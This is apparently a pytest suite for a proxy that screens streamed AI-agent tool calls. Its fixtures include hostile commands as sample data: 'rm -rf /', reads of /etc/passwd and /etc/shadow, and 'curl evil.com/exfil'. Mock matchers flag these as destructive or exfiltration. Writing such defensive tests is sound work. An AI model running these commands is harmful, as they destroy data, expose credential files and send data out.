"""
Tests for SSE (Server-Sent Events) streaming screening in the Tweek proxy.

Covers:
  - SSE event parsing (parse_sse_events)
  - Anthropic streaming tool call reassembly
  - OpenAI streaming tool call reassembly
  - screen_response with is_sse=True
  - screen_response JSON fallback to SSE
  - Addon no longer bails out on text/event-stream
"""

import json

import pytest

from tweek.proxy.interceptor import LLMAPIInterceptor, LLMProvider, ToolCall

pytestmark = pytest.mark.core


# ============================================================================
# Helpers — build realistic SSE bodies
# ============================================================================

def _sse_block(event_type: str, data: dict) -> str:
    """Build one SSE event block."""
    return f"event: {event_type}\ndata: {json.dumps(data)}\n\n"


def _anthropic_tool_stream(
    tool_id: str,
    tool_name: str,
    tool_input: dict,
    index: int = 0,
    chunk_size: int = 20,
) -> str:
    """Build a complete Anthropic SSE stream for one tool call."""
    blocks = []

    # content_block_start
    blocks.append(_sse_block("content_block_start", {
        "type": "content_block_start",
        "index": index,
        "content_block": {
            "type": "tool_use",
            "id": tool_id,
            "name": tool_name,
            "input": {},
        },
    }))

    # content_block_delta — split the JSON input into chunks
    raw = json.dumps(tool_input)
    for i in range(0, len(raw), chunk_size):
        blocks.append(_sse_block("content_block_delta", {
            "type": "content_block_delta",
            "index": index,
            "delta": {
                "type": "input_json_delta",
                "partial_json": raw[i:i + chunk_size],
            },
        }))

    # content_block_stop
    blocks.append(_sse_block("content_block_stop", {
        "type": "content_block_stop",
        "index": index,
    }))

    return "".join(blocks)


def _openai_tool_stream(
    call_id: str,
    func_name: str,
    func_args: dict,
    choice_index: int = 0,
    tc_index: int = 0,
    chunk_size: int = 20,
) -> str:
    """Build a complete OpenAI Chat Completions SSE stream for one tool call."""
    blocks = []

    # First chunk: carries id and function.name
    blocks.append(f"data: {json.dumps({'choices': [{'index': choice_index, 'delta': {'tool_calls': [{'index': tc_index, 'id': call_id, 'type': 'function', 'function': {'name': func_name, 'arguments': ''}}]}}]})}\n\n")

    # Argument delta chunks
    raw = json.dumps(func_args)
    for i in range(0, len(raw), chunk_size):
        blocks.append(f"data: {json.dumps({'choices': [{'index': choice_index, 'delta': {'tool_calls': [{'index': tc_index, 'function': {'arguments': raw[i:i + chunk_size]}}]}}]})}\n\n")

    return "".join(blocks)


# ============================================================================
# Fixture
# ============================================================================

@pytest.fixture
def interceptor():
    """Interceptor with no pattern matcher (allows everything)."""
    return LLMAPIInterceptor()


# ============================================================================
# parse_sse_events
# ============================================================================

class TestParseSSEEvents:

    def test_empty_body(self, interceptor):
        assert interceptor.parse_sse_events(b"") == []

    def test_done_sentinel_skipped(self, interceptor):
        body = b"data: [DONE]\n\n"
        assert interceptor.parse_sse_events(body) == []

    def test_single_event(self, interceptor):
        payload = {"type": "message_start", "message": {"id": "msg_1"}}
        body = f"event: message_start\ndata: {json.dumps(payload)}\n\n".encode()
        events = interceptor.parse_sse_events(body)
        assert len(events) == 1
        assert events[0]["type"] == "message_start"

    def test_multiple_events(self, interceptor):
        body = (
            _sse_block("event_a", {"type": "a"})
            + _sse_block("event_b", {"type": "b"})
            + _sse_block("event_c", {"type": "c"})
        ).encode()
        events = interceptor.parse_sse_events(body)
        assert len(events) == 3

    def test_malformed_json_skipped(self, interceptor):
        body = b"data: not valid json\n\n" + b"data: {\"ok\": true}\n\n"
        events = interceptor.parse_sse_events(body)
        assert len(events) == 1
        assert events[0]["ok"] is True

    def test_no_data_lines_ignored(self, interceptor):
        body = b"event: ping\n: comment\n\n"
        assert interceptor.parse_sse_events(body) == []


# ============================================================================
# Anthropic SSE tool call extraction
# ============================================================================

class TestAnthropicSSE:

    def test_single_tool_call(self, interceptor):
        body = _anthropic_tool_stream(
            "toolu_abc", "Bash", {"command": "ls -la"}
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 1
        assert calls[0].name == "Bash"
        assert calls[0].id == "toolu_abc"
        assert calls[0].input == {"command": "ls -la"}
        assert calls[0].provider == LLMProvider.ANTHROPIC

    def test_multiple_tool_calls(self, interceptor):
        body = (
            _anthropic_tool_stream("toolu_1", "Read", {"file_path": "/etc/passwd"}, index=0)
            + _anthropic_tool_stream("toolu_2", "Bash", {"command": "rm -rf /"}, index=1)
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 2
        assert calls[0].name == "Read"
        assert calls[1].name == "Bash"
        assert calls[1].input == {"command": "rm -rf /"}

    def test_no_tool_calls_in_stream(self, interceptor):
        """Stream with only text blocks produces no tool calls."""
        body = (
            _sse_block("content_block_start", {
                "type": "content_block_start",
                "index": 0,
                "content_block": {"type": "text", "text": ""},
            })
            + _sse_block("content_block_delta", {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "text_delta", "text": "Hello world"},
            })
            + _sse_block("content_block_stop", {
                "type": "content_block_stop",
                "index": 0,
            })
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert calls == []

    def test_empty_input(self, interceptor):
        """Tool with no input params (empty JSON deltas)."""
        body = (
            _sse_block("content_block_start", {
                "type": "content_block_start",
                "index": 0,
                "content_block": {
                    "type": "tool_use", "id": "toolu_empty", "name": "Glob", "input": {},
                },
            })
            + _sse_block("content_block_stop", {
                "type": "content_block_stop",
                "index": 0,
            })
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 1
        assert calls[0].input == {}

    def test_missing_stop_event(self, interceptor):
        """Tool call without content_block_stop still gets flushed."""
        body = (
            _sse_block("content_block_start", {
                "type": "content_block_start",
                "index": 0,
                "content_block": {
                    "type": "tool_use", "id": "toolu_x", "name": "Write", "input": {},
                },
            })
            + _sse_block("content_block_delta", {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "input_json_delta", "partial_json": '{"file_path": "/tmp/a"}'},
            })
            # No content_block_stop
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 1
        assert calls[0].name == "Write"
        assert calls[0].input["file_path"] == "/tmp/a"

    def test_large_input_chunked(self, interceptor):
        """Large tool input split across many small delta chunks."""
        big_input = {"command": "echo " + "A" * 500}
        body = _anthropic_tool_stream(
            "toolu_big", "Bash", big_input, chunk_size=10
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 1
        assert calls[0].input == big_input

    def test_malformed_json_input_preserved(self, interceptor):
        """Malformed partial JSON is stored as _raw."""
        body = (
            _sse_block("content_block_start", {
                "type": "content_block_start",
                "index": 0,
                "content_block": {
                    "type": "tool_use", "id": "toolu_bad", "name": "Bash", "input": {},
                },
            })
            + _sse_block("content_block_delta", {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "input_json_delta", "partial_json": '{"broken": '},
            })
            + _sse_block("content_block_stop", {
                "type": "content_block_stop",
                "index": 0,
            })
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_anthropic_sse(events)
        assert len(calls) == 1
        assert "_raw" in calls[0].input


# ============================================================================
# OpenAI SSE tool call extraction
# ============================================================================

class TestOpenAISSE:

    def test_single_tool_call(self, interceptor):
        body = _openai_tool_stream(
            "call_abc", "bash", {"command": "whoami"}
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_openai_sse(events)
        assert len(calls) == 1
        assert calls[0].name == "bash"
        assert calls[0].id == "call_abc"
        assert calls[0].input == {"command": "whoami"}
        assert calls[0].provider == LLMProvider.OPENAI

    def test_multiple_tool_calls(self, interceptor):
        body = (
            _openai_tool_stream("call_1", "read_file", {"path": "/etc/shadow"}, tc_index=0)
            + _openai_tool_stream("call_2", "run_shell_command", {"command": "curl evil.com"}, tc_index=1)
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_openai_sse(events)
        assert len(calls) == 2
        assert calls[0].name == "read_file"
        assert calls[1].name == "run_shell_command"

    def test_no_tool_calls(self, interceptor):
        """Stream with only text delta (no tool_calls key)."""
        body = (
            f"data: {json.dumps({'choices': [{'index': 0, 'delta': {'content': 'Hello'}}]})}\n\n"
            + "data: [DONE]\n\n"
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_openai_sse(events)
        assert calls == []

    def test_large_arguments_chunked(self, interceptor):
        big_args = {"command": "echo " + "B" * 500}
        body = _openai_tool_stream(
            "call_big", "bash", big_args, chunk_size=10
        ).encode()
        events = interceptor.parse_sse_events(body)
        calls = interceptor.extract_tool_calls_openai_sse(events)
        assert len(calls) == 1
        assert calls[0].input == big_args


# ============================================================================
# extract_tool_calls_sse dispatch
# ============================================================================

class TestExtractToolCallsSSE:

    def test_anthropic_dispatch(self, interceptor):
        body = _anthropic_tool_stream("t1", "Edit", {"file_path": "a.py"}).encode()
        calls = interceptor.extract_tool_calls_sse(body, LLMProvider.ANTHROPIC)
        assert len(calls) == 1
        assert calls[0].name == "Edit"

    def test_openai_dispatch(self, interceptor):
        body = _openai_tool_stream("c1", "write_file", {"path": "x.py"}).encode()
        calls = interceptor.extract_tool_calls_sse(body, LLMProvider.OPENAI)
        assert len(calls) == 1
        assert calls[0].name == "write_file"

    def test_unsupported_provider_returns_empty(self, interceptor):
        body = _anthropic_tool_stream("t1", "Bash", {"command": "ls"}).encode()
        calls = interceptor.extract_tool_calls_sse(body, LLMProvider.GOOGLE)
        assert calls == []

    def test_empty_body(self, interceptor):
        calls = interceptor.extract_tool_calls_sse(b"", LLMProvider.ANTHROPIC)
        assert calls == []


# ============================================================================
# screen_response with is_sse=True
# ============================================================================

class TestScreenResponseSSE:

    def test_sse_response_allowed_no_tools(self, interceptor):
        """SSE stream with no tool calls is allowed."""
        body = (
            _sse_block("message_start", {"type": "message_start"})
            + _sse_block("content_block_start", {
                "type": "content_block_start",
                "index": 0,
                "content_block": {"type": "text", "text": ""},
            })
            + "data: [DONE]\n\n"
        ).encode()
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=True)
        assert result.allowed is True

    def test_sse_response_extracts_tool(self, interceptor):
        """SSE stream with a tool call is parsed and allowed (no pattern matcher)."""
        body = _anthropic_tool_stream("toolu_1", "Bash", {"command": "echo hi"}).encode()
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=True)
        # No pattern matcher → everything is allowed
        assert result.allowed is True

    def test_json_fallback_to_sse(self, interceptor):
        """When is_sse=False but body is SSE, fallback parsing kicks in."""
        body = _anthropic_tool_stream("toolu_fb", "Read", {"file_path": "/tmp/x"}).encode()
        # Don't pass is_sse — body isn't valid JSON, so fallback tries SSE
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=False)
        assert result.allowed is True


# ============================================================================
# screen_response with pattern matcher (blocking)
# ============================================================================

class TestScreenResponseSSEBlocking:

    def test_dangerous_tool_blocked(self):
        """SSE tool call matching a pattern is blocked."""

        class MockMatcher:
            def match(self, command: str):
                if "rm -rf" in command:
                    return ["destructive_command"]
                return []

        interceptor = LLMAPIInterceptor(pattern_matcher=MockMatcher())
        body = _anthropic_tool_stream(
            "toolu_bad", "Bash", {"command": "rm -rf /"}
        ).encode()
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=True)
        assert result.allowed is False
        assert "Bash" in result.blocked_tools
        assert "destructive_command" in result.matched_patterns

    def test_safe_tool_allowed(self):
        """SSE tool call not matching any pattern is allowed."""

        class MockMatcher:
            def match(self, command: str):
                return []

        interceptor = LLMAPIInterceptor(pattern_matcher=MockMatcher())
        body = _anthropic_tool_stream(
            "toolu_ok", "Bash", {"command": "echo hello"}
        ).encode()
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=True)
        assert result.allowed is True

    def test_mixed_tools_one_blocked(self):
        """Multiple tools in SSE — one dangerous, one safe. Result is blocked."""

        class MockMatcher:
            def match(self, command: str):
                if "curl evil" in command:
                    return ["exfiltration"]
                return []

        interceptor = LLMAPIInterceptor(pattern_matcher=MockMatcher())
        body = (
            _anthropic_tool_stream("t1", "Read", {"file_path": "/tmp/safe"}, index=0)
            + _anthropic_tool_stream("t2", "Bash", {"command": "curl evil.com/exfil"}, index=1)
        ).encode()
        result = interceptor.screen_response(body, LLMProvider.ANTHROPIC, is_sse=True)
        assert result.allowed is False
        assert "Bash" in result.blocked_tools

    def test_openai_sse_blocked(self):
        """OpenAI SSE stream with dangerous tool is blocked."""

        class MockMatcher:
            def match(self, command: str):
                if "rm -rf" in command:
                    return ["destructive_command"]
                return []

        interceptor = LLMAPIInterceptor(pattern_matcher=MockMatcher())
        body = _openai_tool_stream(
            "call_bad", "bash", {"command": "rm -rf /home"}
        ).encode()
        result = interceptor.screen_response(body, LLMProvider.OPENAI, is_sse=True)
        assert result.allowed is False
        assert "bash" in result.blocked_tools


# ============================================================================
# Addon integration — SSE no longer skipped
# ============================================================================

class TestAddonSSEIntegration:
    """Verify the addon module no longer contains the SSE bail-out."""

    def test_no_streaming_bypass_in_addon(self):
        """The addon source should not contain the old SSE bypass."""
        import inspect
        from tweek.proxy.addon import TweekProxyAddon

        source = inspect.getsource(TweekProxyAddon.response)
        assert "streaming_unscreened" not in source
        assert "cannot be fully screened" not in source
        assert "bypass proxy screening" not in source

    def test_addon_passes_is_sse(self):
        """The addon source should pass is_sse to screen_response."""
        import inspect
        from tweek.proxy.addon import TweekProxyAddon

        source = inspect.getsource(TweekProxyAddon.response)
        assert "is_sse" in source
